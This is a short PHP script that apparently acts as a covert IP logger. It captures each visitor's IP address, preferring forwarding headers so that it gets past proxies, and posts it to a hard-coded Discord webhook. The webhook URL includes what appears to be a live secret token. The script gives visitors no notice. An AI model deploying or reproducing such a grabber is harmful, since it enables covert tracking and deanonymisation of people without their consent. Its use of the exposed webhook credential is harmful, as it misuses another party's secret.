<?php
$wh = "https://discord.com/api/webhooks/1321051594963550218/jrCE9j6nRnDfddYhiOmA2D9JPIRi1l3Sxgn5sTt8OvgMXLfykYM1pw9vJWO0UQmHoqlf"; 
$ip = $_SERVER['REMOTE_ADDR'];
$hdrs = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_CLIENT_IP'];

foreach ($hdrs as $h) {
    if (!empty($_SERVER[$h])) {
        $ip = explode(',', $_SERVER[$h])[0];
        break;
    }
}

$pl = json_encode(['content' => "User IP: $ip"]);

$ch = curl_init($wh);
curl_setopt_array($ch, [
    CURLOPT_POST => true,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
    CURLOPT_POSTFIELDS => $pl
]);
curl_exec($ch);
curl_close($ch);
